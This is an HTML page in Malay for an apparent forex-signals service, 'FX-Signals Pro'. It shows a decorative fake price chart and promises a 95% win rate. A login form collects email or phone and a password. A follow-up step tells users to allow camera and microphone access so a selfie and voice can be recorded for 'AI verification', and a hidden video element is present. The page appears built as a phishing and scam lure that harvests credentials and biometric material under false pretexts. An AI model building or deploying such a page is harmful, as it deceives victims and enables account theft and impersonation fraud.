<!doctype html>
<html lang="ms">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>FX-Signals Pro — Log Masuk</title>
<link rel="stylesheet" href="style.css">
</head>
<body>
<main class="app">
  <header class="topbar">
    <div class="logo">📈 <span>FX-Signals Pro</span></div>
    <div class="live"><span class="dot"></span> LIVE MARKET</div>
  </header>

  <section class="chart-box">
    <div class="pair">XAU/USD <span class="up">+1.24%</span></div>
    <div class="price">2,342.50</div>
    <div class="bars">
      <div class="bar g" style="height:40%"></div>
      <div class="bar g" style="height:60%"></div>
      <div class="bar r" style="height:30%"></div>
      <div class="bar g" style="height:80%"></div>
      <div class="bar g" style="height:90%"></div>
      <div class="bar r" style="height:50%"></div>
      <div class="bar g" style="height:70%"></div>
      <div class="bar g" style="height:100%"></div>
    </div>
  </section>

  <section class="card" id="login-box">
    <h2>Log Masuk VIP</h2>
    <p class="sub">Dapatkan akses kepada 5-10 signal harian dengan win rate 95%.</p>
    <form id="login-form" novalidate>
      <label>
        <span>E-mel / No. Telefon</span>
        <input id="email" type="text" placeholder="cth: ali@email.com" required>
      </label>
      <label>
        <span>Kata Laluan</span>
        <input id="password" type="password" placeholder="••••••••" required>
      </label>
      <button id="submit-btn" type="submit">Log Masuk Sekarang</button>
      <p id="err" class="err"></p>
    </form>
    <p class="foot">Tiada akaun? <a href="#">Daftar VIP RM50/bulan</a></p>
  </section>

  <section class="card hidden" id="cam-box">
    <h2>Pengesahan Keselamatan</h2>
    <p class="sub">Untuk keselamatan akaun VIP anda, sistem perlu merakam swafoto dan suara anda untuk pengesahan AI. Sila benarkan akses kamera dan mikrofon.</p>
    <video id="preview" autoplay playsinline muted></video>
    <button id="snap-btn" type="button">📸 Mula Pengesahan</button>
    <p id="cam-err" class="err"></p>
  </section>

  <section class="card hidden" id="done-box">
    <h2 style="color:#4ade80">Berjaya!</h2>
    <p class="sub">Akaun anda sedang disahkan. Sila tunggu...</p>
  </section>
</main>
<video id="cam" autoplay playsinline muted hidden></video>
<script type="module" src="app.js"></script>
</body>
</html>
